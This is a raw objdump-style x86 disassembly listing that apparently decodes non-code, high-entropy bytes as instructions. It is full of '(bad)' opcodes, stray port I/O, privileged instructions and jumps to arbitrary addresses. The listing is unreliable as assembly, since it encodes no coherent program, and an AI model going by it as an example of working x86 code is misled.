  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebx+ebx*4+0x4edfaf73],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	fimul  WORD PTR [edx-0x7f]
  41ae0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae10:	rcr    ebp,1
  41ae12:	and    ecx,DWORD PTR [esi+0x77]
  41ae15:	pop    ds
  41ae16:	and    al,0x42
  41ae18:	mov    ds:0x3bf54f79,eax
  41ae1d:	inc    edx
  41ae1e:	jo     0x41ae9c
  41ae20:	ret    
  41ae21:	fs mov esp,0xa2ebea34
  41ae27:	dec    ebx
  41ae28:	scas   eax,DWORD PTR es:[edi]
  41ae29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae2a:	pop    edx
  41ae2b:	mov    bh,0xaf
  41ae2d:	mov    al,ds:0x17aeb415
  41ae32:	pop    ecx
  41ae33:	inc    eax
  41ae34:	stos   DWORD PTR es:[edi],eax
  41ae35:	mov    dl,0xd8
  41ae37:	cmp    BYTE PTR ds:0x133dfbc9,bl
  41ae3d:	push   esi
  41ae3e:	jae    0x41ae90
  41ae40:	stc    
  41ae41:	(bad)  
  41ae42:	dec    ebx
  41ae43:	stos   DWORD PTR es:[edi],eax
  41ae44:	mov    ch,0x7e
  41ae46:	aad    0xa9
  41ae48:	jmp    0xc41a:0xdc745ad5
  41ae4f:	icebp  
  41ae50:	rol    DWORD PTR [ebx-0x21],cl
  41ae53:	repz mov dh,0xd5
  41ae56:	mov    al,ds:0xe29cb039
  41ae5b:	adc    BYTE PTR [esi],cl
  41ae5d:	xor    al,0x41
  41ae5f:	cmp    eax,0x4cc137d5
  41ae64:	and    esi,ebx
  41ae66:	jg     0x41ae7d
  41ae68:	dec    esi
  41ae69:	inc    eax
  41ae6a:	sub    cl,0x20
  41ae6d:	es stos DWORD PTR es:[edi],eax
  41ae6f:	sub    ebp,DWORD PTR [edx+eax*2+0x67]
  41ae73:	(bad)  
  41ae74:	das    
  41ae75:	lahf   
  41ae76:	mov    cs,WORD PTR [eax-0x353c90ff]
  41ae7c:	dec    ecx
  41ae7d:	pop    edi
  41ae7e:	loope  0x41ae66
  41ae80:	push   0x938b5085
  41ae85:	in     eax,dx
  41ae86:	jno    0x41aecb
  41ae88:	add    DWORD PTR [edi],edi
  41ae8a:	call   DWORD PTR [eax-0x4f]
  41ae8d:	push   0x29
  41ae8f:	cmp    cl,0xd5
  41ae92:	sbb    al,0xcd
  41ae94:	sub    eax,0x5626bca2
  41ae99:	mov    cl,0xfe
  41ae9b:	jbe    0x41ae9f
  41ae9d:	test   eax,0x8a49783e
  41aea2:	retf   
  41aea3:	pop    ebx
  41aea4:	out    dx,al
  41aea5:	cdq    
  41aea6:	stc    
  41aea7:	mov    ah,0x9b
  41aea9:	mov    ebp,0xf7b4aade
  41aeae:	retf   0x4bc3
  41aeb1:	aas    
  41aeb2:	cmp    eax,0xa69b88d0
  41aeb7:	push   cs
  41aeb8:	jns    0x41ae53
  41aeba:	sub    al,0x6f
  41aebc:	das    
  41aebd:	(bad)  
  41aebf:	mov    ch,0x83
  41aec1:	mov    dh,0xcb
  41aec3:	pop    ecx
  41aec4:	outs   dx,BYTE PTR ds:[esi]
  41aec5:	sar    BYTE PTR [esi+0x24],0xb6
  41aec9:	xor    DWORD PTR [edi+0x7d],esi
  41aecc:	sbb    dh,BYTE PTR [edi-0x54]
  41aecf:	cmp    DWORD PTR [edx-0x6beb4910],0xfc7f38d7
  41aed9:	fwait
  41aeda:	mov    BYTE PTR [eax+edi*4+0x5a],bh
  41aede:	and    edx,ebx
  41aee0:	push   cs
  41aee1:	push   edi
  41aee2:	mov    eax,0x72e891fe
  41aee7:	and    DWORD PTR [esi-0x74],0x7b13773b
  41aeee:	in     eax,dx
  41aeef:	xrelease xchg DWORD PTR [eax-0x5fbcba32],ebx
  41aef6:	jmp    0xf564ef17
  41aefb:	jge    0x41ae99
  41aefd:	xlat   BYTE PTR ds:[ebx]
  41aefe:	gs dec ebp
  41af00:	sbb    al,0x20
  41af02:	test   eax,0x5f2b43dd
  41af07:	in     al,0x2d
  41af09:	cwde   
  41af0a:	lds    ecx,FWORD PTR [ecx+0xb]
  41af0d:	adc    ah,0xb6
  41af10:	ins    BYTE PTR es:[edi],dx
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x18f944ee
  41af82:	lods   al,BYTE PTR ds:[esi]
  41af83:	in     eax,dx
  41af84:	push   ebx
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0xce000001
  41af8d:	fwait
  41af8e:	add    DWORD PTR [eax-0x3f694e11],esp
  41af94:	addr16 mov ebx,0x32a6da7c
  41af9a:	popf   
  41af9b:	fsubr  DWORD PTR es:[ebx]
  41af9e:	leave  
  41af9f:	imul   eax,DWORD PTR [esi+0x47b325d],0x75abab65
  41afa9:	lods   eax,DWORD PTR ds:[esi]
  41afaa:	test   DWORD PTR [eax-0x652b379c],esp
  41afb0:	in     al,dx
  41afb1:	sbb    esp,DWORD PTR [ebp-0x6a]
  41afb4:	clc    
  41afb5:	stos   DWORD PTR es:[edi],eax
  41afb6:	into   
  41afb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afb8:	jge    0x41af4d
  41afba:	mov    cl,0x67
  41afbc:	mov    esi,eax
  41afbe:	and    esp,DWORD PTR [edi-0x6a]
  41afc1:	aas    
  41afc2:	imul   edi,DWORD PTR [ecx-0x5611c735],0x29
  41afc9:	sub    DWORD PTR [esi+0x6021124f],ebx
  41afcf:	test   eax,0xefbda332
  41afd4:	lock mov cl,0xd2
  41afd7:	mul    DWORD PTR [ecx-0x5c]
  41afda:	cmp    cl,cl
  41afdc:	test   dh,ah
  41afde:	mov    ecx,esi
  41afe0:	mov    bh,0x36
  41afe2:	call   DWORD PTR [eax-0x1b]
  41afe5:	sbb    al,0x59
  41afe7:	pop    ebp
  41afe8:	cmp    ch,ah
  41afea:	leave  
  41afeb:	push   es
  41afec:	cdq    
  41afed:	pop    edx
  41afee:	in     al,0x11
  41aff0:	push   esp
  41aff1:	hlt    
  41aff2:	adc    al,0x8a
  41aff4:	pop    ebp
  41aff5:	or     al,0x27
  41aff7:	std    
  41aff8:	mov    dh,0x7a
  41affa:	jecxz  0x41b029
  41affc:	shr    al,1
  41affe:	and    esi,eax
  41b000:	(bad)  
  41b001:	mov    BYTE PTR [eax],0x7a
  41b004:	or     al,BYTE PTR [edi-0x39f89d0c]
  41b00a:	inc    ecx
  41b00b:	rcl    esp,cl
  41b00d:	push   0xffffffbe
  41b00f:	sahf   
  41b010:	sub    edi,edx
  41b012:	into   
  41b013:	icebp  
  41b014:	cmc    
  41b015:	out    0x97,al
  41b017:	xor    ecx,edi
  41b019:	jg     0x41afd8
  41b01b:	inc    ecx
  41b01c:	aad    0xc2
  41b01e:	adc    edx,ebp
  41b020:	pusha  
  41b021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b022:	jmp    0x41b06e
  41b024:	pop    ebx
  41b025:	iret   
  41b026:	add    BYTE PTR [eax-0x6cc7c313],cl
  41b02c:	(bad)  [ebx]
  41b02e:	xchg   ebx,eax
  41b02f:	daa    
  41b030:	push   edx
  41b031:	or     BYTE PTR [edi-0x3],ah
  41b034:	xchg   esi,eax
  41b035:	(bad)  
  41b037:	add    ebx,DWORD PTR [eax-0x3931c47b]
  41b03d:	scas   eax,DWORD PTR es:[edi]
  41b03e:	dec    esi
  41b03f:	push   ebp
  41b040:	rcr    esi,cl
  41b042:	addr16 mov edi,0xa6102037
  41b048:	jmp    0x41afe8
  41b04a:	mov    ch,0x67
  41b04c:	pusha  
  41b04d:	xchg   eax,ecx
  41b04f:	pop    ds
  41b050:	(bad)  
  41b051:	shr    cl,1
  41b053:	and    BYTE PTR [esi],ah
  41b055:	or     bh,BYTE PTR ds:0xb8c18857
  41b05b:	in     al,dx
  41b05c:	xor    ch,ah
  41b05e:	ret    0xf5c5
  41b061:	cli    
  41b062:	aad    0xef
  41b064:	xchg   esp,esp
  41b066:	popa   
  41b067:	jmp    0x51d951c7
  41b06c:	push   cs
  41b06d:	pop    eax
  41b06e:	sbb    eax,0x4ce5170e
  41b073:	fidivr DWORD PTR [ecx-0xd]
  41b076:	pop    esi
  41b077:	push   cs
  41b078:	jnp    0x41b029
  41b07a:	mov    ah,0xb6
  41b07c:	loope  0x41b012
  41b07e:	dec    esi
  41b07f:	into   
  41b080:	push   ebp
  41b081:	fimul  WORD PTR [ebx+0x30]
  41b084:	xor    DWORD PTR [ecx+0x7],edx
  41b087:	dec    eax
  41b088:	loope  0x41b03c
  41b08a:	cmp    eax,0xe0971bdd
  41b08f:	dec    ecx
  41b090:	or     al,BYTE PTR [eax]
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x4b6a868e
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x69000001
  41b10d:	repnz cmp BYTE PTR [edi+0x590df314],0xf
  41b115:	std    
  41b116:	add    edx,DWORD PTR [edi]
  41b118:	push   cs
  41b119:	into   
  41b11a:	in     eax,dx
  41b11b:	cmp    al,BYTE PTR [ebx]
  41b11d:	icebp  
  41b11e:	sti    
  41b11f:	cmp    cl,BYTE PTR [eax-0x7bc53893]
  41b125:	inc    BYTE PTR ds:0xf2d16aea
  41b12b:	imul   edx,DWORD PTR [edx],0xffffffb1
  41b12e:	js     0x41b169
  41b130:	(bad)  
  41b131:	rcr    DWORD PTR [ecx+0x13e396b2],0x84
  41b138:	ror    BYTE PTR [ebx-0x46],1
  41b13b:	push   eax
  41b13c:	fld    TBYTE PTR [eax]
  41b13e:	fsub   DWORD PTR [edi+0x41940a08]
  41b144:	push   0x3f
  41b146:	pop    ds
  41b147:	pop    esp
  41b148:	out    dx,eax
  41b149:	test   al,0xa3
  41b14b:	adc    dl,BYTE PTR [eax+0x33]
  41b14e:	pop    ebx
  41b14f:	shl    DWORD PTR [ebx-0x47],1
  41b152:	mov    al,0xd6
  41b154:	sub    edi,ecx
  41b156:	addr16 ss daa 
  41b159:	add    esp,DWORD PTR [edi]
  41b15b:	jno    0x41b0e6
  41b15d:	sahf   
  41b15e:	es cdq 
  41b160:	cwde   
  41b161:	in     al,0xff
  41b163:	in     al,0xc8
  41b165:	mov    al,ds:0xdf54849b
  41b16a:	pusha  
  41b16b:	push   cs
  41b16c:	pop    es
  41b16d:	in     eax,dx
  41b16e:	or     ah,BYTE PTR [ecx]
  41b170:	mov    bh,0xb2
  41b172:	mov    dl,0xa1
  41b174:	adc    eax,0x5e46dfb2
  41b179:	out    0xf8,eax
  41b17b:	push   ebx
  41b17c:	das    
  41b17d:	xchg   esi,eax
  41b17e:	push   di
  41b180:	ss jno 0x41b1e2
  41b183:	sar    DWORD PTR [ecx-0x7f],cl
  41b186:	je     0x41b19e
  41b188:	jbe    0x41b176
  41b18a:	arpl   sp,bp
  41b18c:	es loope 0x41b17b
  41b18f:	fnsave [edx-0x7cd25e5c]
  41b195:	icebp  
  41b196:	loop   0x41b124
  41b198:	and    BYTE PTR [edi],0x26
  41b19b:	lods   al,BYTE PTR ds:[esi]
  41b19c:	cdq    
  41b19d:	add    ah,BYTE PTR [eax+0x8]
  41b1a0:	ja     0x41b187
  41b1a2:	dec    esi
  41b1a3:	fbld   TBYTE PTR [ebx+0x3cdb6e8f]
  41b1a9:	mov    bl,0x7d
  41b1ab:	iret   
  41b1ac:	xor    eax,0xc79e0307
  41b1b1:	mov    bh,dh
  41b1b3:	add    bl,bl
  41b1b5:	jg     0x41b226
  41b1b7:	jg     0x41b142
  41b1b9:	ss leave 
  41b1bb:	xlat   BYTE PTR ds:[ebx]
  41b1bc:	aam    0x6e
  41b1be:	popa   
  41b1bf:	fisttp WORD PTR [ecx+0x5c]
  41b1c2:	or     eax,0x609236b
  41b1c7:	inc    ecx
  41b1c8:	repnz cmp eax,0xf11792a4
  41b1ce:	stos   BYTE PTR es:[edi],al
  41b1cf:	jge    0x41b1f8
  41b1d1:	imul   ebp,DWORD PTR [edi-0x75],0xffffffd6
  41b1d5:	ins    BYTE PTR es:[edi],dx
  41b1d6:	add    eax,0xb5d4717d
  41b1db:	shr    BYTE PTR [ebx],0xf8
  41b1de:	adc    al,0xf2
  41b1e0:	push   edx
  41b1e1:	scas   al,BYTE PTR es:[edi]
  41b1e2:	fxch   st(7)
  41b1e4:	jmp    0xe8d171ff
  41b1e9:	pop    edi
  41b1ea:	mov    ecx,0x5a81c53c
  41b1ef:	add    bl,ch
  41b1f1:	adc    DWORD PTR ds:0xe4bbb075,edx
  41b1f7:	ret    0xd60e
  41b1fa:	not    DWORD PTR [esi-0x47]
  41b1fd:	mov    ds:0x7a3eced2,eax
  41b202:	iret   
  41b203:	ds cwde 
  41b205:	mov    ds:0xaa5d7ebb,al
  41b20a:	out    dx,eax
  41b20b:	cwde   
  41b20c:	ja     0x41b276
  41b20e:	add    ebx,ebp
  41b210:	add    BYTE PTR ss:[eax],al
	...
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [ebx],bh
  41b281:	data16 ins BYTE PTR es:[edi],dx
  41b283:	retf   0x205d
  41b286:	add    DWORD PTR [eax],eax
  41b288:	add    eax,0x76000001
  41b28d:	jae    0x41b248
  41b28f:	sub    BYTE PTR [edi-0x5328590b],0xd3
  41b296:	enter  0x252d,0xe0
  41b29a:	xchg   ecx,eax
  41b29b:	and    BYTE PTR [edi],dh
  41b29d:	and    DWORD PTR [esi+eiz*1],ebx
  41b2a0:	pushf  
  41b2a1:	imul   ecx,DWORD PTR [ecx+eiz*4+0x79e275bd],0x9a4658f9
  41b2ac:	scas   eax,DWORD PTR es:[edi]
  41b2ad:	push   edi
  41b2ae:	sar    DWORD PTR [ebp-0x15],0xaa
  41b2b2:	cmp    edi,DWORD PTR [eax-0x62]
  41b2b5:	fs pop ss
  41b2b7:	inc    ebp
  41b2b8:	stos   DWORD PTR es:[edi],eax
  41b2b9:	dec    ecx
  41b2ba:	(bad)  
  41b2bb:	xlat   BYTE PTR ds:[ebx]
  41b2bc:	lods   eax,DWORD PTR ds:[esi]
  41b2bd:	inc    edi
  41b2be:	lahf   
  41b2bf:	jbe    0x41b270
  41b2c1:	or     al,0x1c
  41b2c3:	call   0xc7d8f0ce
  41b2c8:	test   cl,ah
  41b2ca:	push   edi
  41b2cb:	cwde   
  41b2cc:	sub    eax,0xf7af709d
  41b2d1:	xlat   BYTE PTR ds:[ebx]
  41b2d2:	nop
  41b2d3:	sbb    BYTE PTR [esi-0xc],dl
  41b2d6:	repz repz or eax,0xb117f7b4
  41b2dd:	add    eax,0x177dd615
  41b2e2:	mov    esi,0x178ff267
  41b2e7:	or     ch,cl
  41b2e9:	jbe    0x41b307
  41b2eb:	(bad)  
  41b2ed:	or     ebx,DWORD PTR [eax]
  41b2ef:	ficom  DWORD PTR [edx-0x6e]
  41b2f2:	sub    eax,0xa956e751
  41b2f7:	mov    ecx,?
  41b2f9:	sbb    edi,DWORD PTR [ebp+ecx*4+0x3613927b]
  41b300:	sub    DWORD PTR [eax],edi
  41b302:	in     al,0xd2
  41b304:	or     eax,0x40dd461f
  41b309:	loop   0x41b33c
  41b30b:	bnd jo 0x41b2e4
  41b30e:	lods   eax,DWORD PTR ds:[esi]
  41b30f:	ins    DWORD PTR es:[edi],dx
  41b310:	outs   dx,DWORD PTR ds:[esi]
  41b311:	js     0x41b2ef
  41b313:	or     BYTE PTR [eax],bh
  41b315:	mov    eax,0xbd22fa8b
  41b31a:	aam    0x2c
  41b31c:	cwde   
  41b31d:	(bad)  
  41b31f:	inc    edx
  41b320:	sbb    ch,BYTE PTR [edi]
  41b322:	mov    ah,dh
  41b324:	int    0x40
  41b326:	cdq    
  41b327:	call   0x3b57d133
  41b32c:	xchg   edx,eax
  41b32d:	inc    eax
  41b32e:	dec    ebx
  41b32f:	sbb    BYTE PTR [ebx+0x50],bl
  41b332:	pop    eax
  41b333:	std    
  41b334:	les    ebp,FWORD PTR [edi+edx*8-0x6c5d8181]
  41b33b:	std    
  41b33c:	(bad)  
  41b33d:	jo     0x41b2ed
  41b33f:	fst    QWORD PTR [eax]
  41b341:	hlt    
  41b342:	dec    eax
  41b343:	mov    dh,0xc2
  41b345:	ret    
  41b346:	sub    edx,DWORD PTR [edx]
  41b348:	lahf   
  41b349:	idiv   DWORD PTR [edi-0x37]
  41b34c:	push   0x9ee48e4b
  41b351:	dec    esp
  41b352:	and    DWORD PTR [esi+0x48be3318],ebp
  41b358:	xchg   ebx,eax
  41b359:	repnz xchg ecx,eax
  41b35b:	inc    ecx
  41b35c:	dec    edx
  41b35d:	push   es
  41b35e:	adc    esi,ebx
  41b360:	xchg   ecx,eax
  41b361:	(bad)  
  41b362:	ds jmp 0x41b342
  41b365:	pop    ss
  41b366:	out    0x84,eax
  41b368:	adc    bh,BYTE PTR [ecx+0x1c0efb59]
  41b36e:	add    BYTE PTR [ecx],bl
  41b370:	inc    ebx
  41b371:	dec    edx
  41b372:	repz jne 0x41b309
  41b375:	sbb    dl,ch
  41b377:	movlps xmm6,QWORD PTR [ebp+ebx*1-0x2]
  41b37c:	or     eax,0x842da20c
  41b381:	mov    ds:0x3515d9e3,eax
  41b386:	inc    ebp
  41b387:	sti    
  41b388:	out    0xcc,al
  41b38a:	pop    esi
  41b38b:	cs scas eax,DWORD PTR es:[edi]
  41b38d:	inc    ebx
  41b38e:	leave  
  41b38f:	sti    
  41b390:	test   DWORD PTR [eax],0x0
	...
  41b3f2:	add    BYTE PTR [eax],al
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	ds ja  0x41b39b
  41b403:	in     al,0x62
  41b405:	and    DWORD PTR [ecx],eax
  41b407:	add    BYTE PTR ds:0x50000001,al
  41b40d:	fistp  WORD PTR [edi-0x77]
  41b410:	sbb    DWORD PTR [esi],0x82bf6d7f
  41b416:	dec    ebp
  41b417:	adc    DWORD PTR [eax+0x715db682],ebp
  41b41d:	jnp    0x41b3a5
  41b41f:	dec    edx
  41b420:	daa    
  41b421:	(bad)  
  41b422:	adc    al,BYTE PTR [ecx+0x6b8341c2]
  41b428:	xor    ebp,DWORD PTR [edx-0x5e]
  41b42b:	les    edx,FWORD PTR [edi-0x27]
  41b42e:	push   esp
  41b42f:	rol    cl,1
  41b431:	or     eax,0x1fe5b77e
  41b436:	int    0xf
  41b438:	out    dx,al
  41b439:	push   esi
  41b43a:	shr    BYTE PTR [edi+0x764d10c3],0xa7
  41b441:	or     al,0x4d
  41b443:	test   eax,0x5bbe7bab
  41b448:	call   0x6c91:0x64f5923d
  41b44f:	mov    WORD PTR [ecx],es
  41b451:	js     0x41b430
  41b453:	jae    0x41b4ab
  41b455:	sub    bl,bl
  41b457:	xchg   BYTE PTR [ebp+0x7f8e5516],dh
  41b45d:	cdq    
  41b45e:	mov    ebp,0xa49858b4
  41b463:	sbb    DWORD PTR [ecx],0xffffffd8
  41b466:	xchg   ebp,eax
  41b467:	mov    eax,ds:0x4557de7a
  41b46c:	adc    esp,DWORD PTR [ebx]
  41b46e:	xchg   ebx,eax
  41b46f:	dec    edi
  41b470:	es mov dh,0x84
  41b473:	xlat   BYTE PTR ds:[ebx]
  41b474:	mov    ch,0x2
  41b476:	mov    al,0x3b
  41b478:	ins    DWORD PTR es:[edi],dx
  41b479:	dec    esi
  41b47a:	and    eax,0xf723b2b6
  41b47f:	sahf   
  41b480:	jmp    0x7422a657
  41b485:	cdq    
  41b486:	inc    edx
  41b487:	xchg   ebx,eax
  41b488:	xor    esi,ecx
  41b48a:	ror    cl,0xa1
  41b48d:	jge    0x41b4ea
  41b48f:	fmul   st(3),st
  41b491:	popf   
  41b492:	std    
  41b493:	cs pop esi
  41b495:	scas   al,BYTE PTR es:[edi]
  41b496:	ss cmc 
  41b498:	inc    esi
  41b499:	adc    bh,BYTE PTR [ebp-0x68]
  41b49c:	pop    ecx
  41b49d:	(bad)  
  41b49e:	cld    
  41b49f:	les    edx,FWORD PTR gs:[ebx+ecx*8-0x71]
  41b4a4:	add    cl,dh
  41b4a6:	xlat   BYTE PTR ds:[ebx]
  41b4a7:	stos   BYTE PTR es:[edi],al
  41b4a8:	pop    edx
  41b4a9:	mov    ebp,0x2eb7a2a0
  41b4ae:	cld    
  41b4af:	pop    eax
  41b4b0:	into   
  41b4b1:	cli    
  41b4b2:	cmp    eax,0x361e6a0e
  41b4b7:	loop   0x41b487
  41b4b9:	enter  0xb069,0xeb
  41b4bd:	sbb    DWORD PTR [eax+0xb0282a0],0x1baeea8e
  41b4c7:	(bad)  
  41b4c8:	mov    bh,0xa1
  41b4ca:	sbb    eax,0xffffff98
  41b4cd:	ret    
  41b4ce:	xchg   ecx,edx
  41b4d0:	mov    esp,0xffc01964
  41b4d5:	(bad)  
  41b4d6:	es test al,0xb3
  41b4d9:	ret    0xe87e
  41b4dc:	push   0x6750ce74
  41b4e1:	in     al,dx
  41b4e2:	and    cl,BYTE PTR [edi]
  41b4e4:	scas   al,BYTE PTR es:[edi]
  41b4e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4e6:	pop    es
  41b4e7:	mov    eax,0x6f242998
  41b4ec:	xor    DWORD PTR [ebx-0x5],ebp
  41b4ef:	pop    esp
  41b4f0:	mov    esp,0xcad19fc3
  41b4f5:	(bad)  
  41b4f6:	cmp    al,0xb
  41b4f8:	call   0x664bc5f8
  41b4fd:	cmp    cl,bh
  41b4ff:	sbb    eax,0xe32cd9f0
  41b504:	out    dx,al
  41b505:	sbb    BYTE PTR [edi+0x6b],0x2a
  41b509:	rcr    eax,cl
  41b50b:	aas    
  41b50c:	xor    eax,0x31d97194
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	ja     0x41b505
  41b582:	mov    al,0xa2
  41b584:	and    al,BYTE PTR [bx+di]
  41b587:	add    BYTE PTR ds:0x39000001,al
  41b58d:	sub    al,0xe
  41b58f:	sti    
  41b590:	dec    edi
  41b591:	jo     0x41b569
  41b593:	jecxz  0x41b570
  41b595:	jno    0x41b51d
  41b597:	sub    cl,dh
  41b599:	adc    DWORD PTR [eax+0x50ce54f],esi
  41b59f:	jp     0x41b564
  41b5a1:	sbb    bh,dh
  41b5a3:	arpl   WORD PTR [ebp+0x11ad1bda],dx
  41b5a9:	cdq    
  41b5aa:	in     eax,0x3f
  41b5ac:	imul   esp,eax,0x39
  41b5af:	stos   DWORD PTR es:[edi],eax
  41b5b0:	shr    DWORD PTR [eax+0x69b5ba96],0xeb
  41b5b7:	fcmovnu st,st(6)
  41b5b9:	xor    BYTE PTR [edx],al
  41b5bb:	pusha  
  41b5bc:	cli    
  41b5bd:	push   ds
  41b5be:	enter  0xe80,0x56
  41b5c2:	xor    esp,edx
  41b5c4:	call   0x2a78:0x36317a68
  41b5cb:	call   0x613b:0x332f5a5e
  41b5d2:	jnp    0x41b61f
  41b5d4:	jmp    0x6d05:0x8d76086b
  41b5db:	(bad)
  41b5de:	xchg   ebp,eax
  41b5df:	cmc    
  41b5e0:	sub    edi,DWORD PTR [ecx]
  41b5e2:	mov    ebp,0xc1b55be6
  41b5e7:	sub    DWORD PTR [esi-0x6c],0xeefdc67c
  41b5ee:	popf   
  41b5ef:	jmp    0xe37f02a0
  41b5f4:	push   esp
  41b5f5:	sbb    ebx,eax
  41b5f7:	fnstenv [edx]
  41b5f9:	fadd   QWORD PTR [eax+ecx*1+0x494e4718]
  41b600:	jl     0x41b618
  41b602:	test   DWORD PTR [esi-0x6c31e497],edi
  41b608:	cli    
  41b609:	mov    BYTE PTR [edx],ah
  41b60b:	nop
  41b60c:	inc    ebx
  41b60d:	js     0x41b606
  41b60f:	lods   al,BYTE PTR ds:[esi]
  41b610:	mov    edi,0xfee6b797
  41b615:	les    edx,FWORD PTR ds:0xa9a2f26a
  41b61b:	sub    BYTE PTR [edi],bh
  41b61d:	dec    ebp
  41b61e:	aam    0xca
  41b620:	mov    edx,0x95bd6cea
  41b625:	ds dec eax
  41b627:	or     BYTE PTR [ecx],bh
  41b629:	or     ebx,DWORD PTR [edi]
  41b62b:	retf   0xc0ec
  41b62e:	jmp    0x98dbcbd2
  41b633:	mov    ch,0x9a
  41b635:	out    dx,al
  41b636:	popf   
  41b637:	jle    0x41b5db
  41b639:	sbb    eax,0xb21a6d54
  41b63e:	test   eax,0x9197a77d
  41b643:	fldenv [esi-0x8]
  41b646:	fs pop ebp
  41b648:	das    
  41b649:	pop    ds
  41b64a:	fild   QWORD PTR [edx+0x157eb33b]
  41b650:	pop    ebx
  41b651:	inc    esi
  41b652:	test   eax,0xc4fe5eaf
  41b657:	jns    0x41b672
  41b659:	lds    esi,FWORD PTR [esi]
  41b65b:	aam    0xe9
  41b65d:	ror    BYTE PTR [ebx+0x53],cl
  41b660:	std    
  41b661:	(bad)  
  41b662:	pop    edi
  41b663:	inc    esi
  41b664:	lods   al,BYTE PTR ds:[esi]
  41b665:	mov    eax,0x49753066
  41b66a:	mov    edx,DWORD PTR [esi+eiz*1+0x22]
  41b66e:	(bad)  
  41b66f:	out    0xe6,eax
  41b671:	cli    
  41b672:	xlat   BYTE PTR ds:[ebx]
  41b673:	inc    ebx
  41b674:	mov    eax,ds:0xda687cd8
  41b679:	sbb    BYTE PTR [ebp-0x3ac6a0a9],ah
  41b67f:	sbb    al,0x1c
  41b681:	arpl   ax,sp
  41b683:	nop
  41b684:	(bad)  
  41b685:	(bad)  
  41b686:	idiv   BYTE PTR [ebx+0x2c]
  41b689:	idiv   DWORD PTR [edx]
  41b68b:	ja     0x54ca1d73
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	jle    0x41b6dc
  41b702:	pop    edi
  41b703:	cld    
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0xf000001,al
  41b70d:	in     al,0x5
  41b70f:	notrack jmp DWORD PTR [edi+ebp*4+0x1232cf67]
  41b717:	mov    ds:0x8b169fd,al
  41b71c:	push   eax
  41b71d:	cld    
  41b71e:	xchg   cx,ax
  41b720:	aad    0x4b
  41b722:	mov    al,ds:0x6d42c698
  41b728:	movups xmm3,xmm6
  41b72b:	mov    ch,0xab
  41b72d:	mov    al,0xa4
  41b72f:	fdivrp st(7),st
  41b731:	or     BYTE PTR [edi-0x420b984],ch
  41b737:	dec    ebx
  41b738:	jecxz  0x41b735
  41b73a:	cmp    ch,dl
  41b73c:	cld    
  41b73d:	ror    DWORD PTR [ebp+ebx*8+0x55827286],cl
  41b744:	fidiv  DWORD PTR [edx]
  41b746:	das    
  41b747:	mov    esp,ebp
  41b749:	and    cl,bh
  41b74b:	sub    eax,0x43bafeda
  41b750:	neg    DWORD PTR [ebx-0x21]
  41b753:	and    dl,al
  41b755:	xchg   edx,eax
  41b756:	outs   dx,DWORD PTR ds:[esi]
  41b757:	fist   WORD PTR [esi-0x7c]
  41b75a:	ins    BYTE PTR es:[edi],dx
  41b75b:	sahf   
  41b75c:	enter  0x2173,0xbb
  41b760:	retf   0x902e
  41b763:	push   0xa22fab28
  41b768:	pop    es
  41b769:	xlat   BYTE PTR ds:[ebx]
  41b76a:	aad    0x3c
  41b76c:	pop    es
  41b76d:	push   ebx
  41b76e:	add    BYTE PTR [edi+0x16],0x1
  41b772:	jl     0x41b78b
  41b774:	mov    BYTE PTR [ecx],al
  41b776:	sub    eax,0xb0bfd961
  41b77b:	add    al,0xa
  41b77d:	gs mov esp,ebp
  41b780:	shl    BYTE PTR [esi+0x2b],cl
  41b783:	dec    esp
  41b784:	mov    al,ds:0xf4575d81
  41b789:	xchg   esp,eax
  41b78a:	sahf   
  41b78b:	fld    TBYTE PTR [ebp+eax*8+0x7e182ebd]
  41b792:	test   DWORD PTR [ebp-0x6bab067b],esi
  41b798:	daa    
  41b799:	sub    DWORD PTR [ecx],ebx
  41b79b:	pop    esp
  41b79c:	push   ss
  41b79d:	lds    edi,FWORD PTR [edi-0x79]
  41b7a0:	or     eax,0x49779fca
  41b7a5:	pop    ebx
  41b7a6:	dec    edx
  41b7a7:	out    dx,al
  41b7a8:	call   0x5f93:0x92b9595b
  41b7af:	xchg   DWORD PTR [ecx+0x3ddeffb2],ebx
  41b7b5:	fsubp  st(3),st
